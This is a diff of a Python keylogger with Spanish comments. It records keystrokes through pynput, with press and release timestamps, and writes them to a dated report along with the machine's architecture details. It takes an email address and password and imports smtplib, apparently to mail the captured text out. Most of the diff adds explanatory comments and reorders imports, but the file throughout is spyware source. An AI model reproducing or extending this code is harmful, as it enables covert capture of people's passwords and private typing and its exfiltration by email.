@@ -1,20 +1,19 @@
+#Librerías Importadas
 import pynput.keyboard
 import threading
 import smtplib
 from datetime import date
 from datetime import datetime
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-import contador
-import report
 import os
 import sys
 import fileinput
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+#Funciones Importadas
+import contador
+import report
 
-
-
-
-log =""
+log ="" #Variable que Captura los datos
 
 #Clase keylogger
 class Keylogger:
@@ -24,9 +23,9 @@ class Keylogger:
     fin=""
     txt=report.report("reporte_timing.txt")
     count=0
-
     z = datetime.now()
     m = "keylogger_fecha_{}.txt".format(z.strftime("%d-%m-%Y_%H-%M-%S"))
+
     #inicializando valores
     def __init__(self, time_interval, email, password):
         self.log=""
@@ -34,11 +33,10 @@ class Keylogger:
         self.email = email
         self.password = password
 
-
-
-    #uniendo los valores
+    #Creando Strings con los valores capturados
     def append_to_log(self,string):
         self.log=self.log + string
+    
     #leyendo el ingreso
     def process_key_press(self, key):
         self.pressKey(key)
@@ -106,21 +104,27 @@ class Keylogger:
         with open(ftS,"w") as file:
             file.write(filedata)
         #se termina de eliminar caracteres no legibles para enviar correo
+        #Se agregan los datos de la arquitectura
         archivo = open("arquitectura.txt","r")
         cad = archivo.read()
         archivo.close()        
         archivo = open(self.m,"w")
         archivo.write('***************************Arquitectura del computador***************************''\n'+cad+'\n')
         archivo.close()
+        
+        #Se agrega la cadena capturada
         archivo = open(self.m,"a")
         archivo.write('*********************************Texto Capturado*********************************'+'\n'+captexto+'\n')
         archivo.close()
+        #Se agrega el conteo de caracteres
         archivo = open("temp.txt","r")
         cadenita=str(archivo.read())
         archivo.close()
         archivo = open(self.m,"a")
         archivo.write(cadenita)
         archivo.close()
+        
+        #Se agrega el report timing
         archivo = open("reporte_timing.txt","r")
         cad = archivo.read()
         archivo.close()
@@ -159,12 +163,12 @@ class Keylogger:
         self.captcha=self.keyword+"\t\t\t"+self.inicio+"\t\t"+self.fin
         rt.timing(self.captcha,rt.setName())
         self.captcha=""
-
+#Se guardan los datos al presionar una tecla
     def pressKey(self, key):
         if self.count==0:
             self.inicio=str(datetime.today())
         self.count=self.count+1
-
+#Se guardan los datos al soltar una tecla
     def leaveKey(self, key):
         self.fin=str(datetime.today())
         self.pressRecord(self.txt)
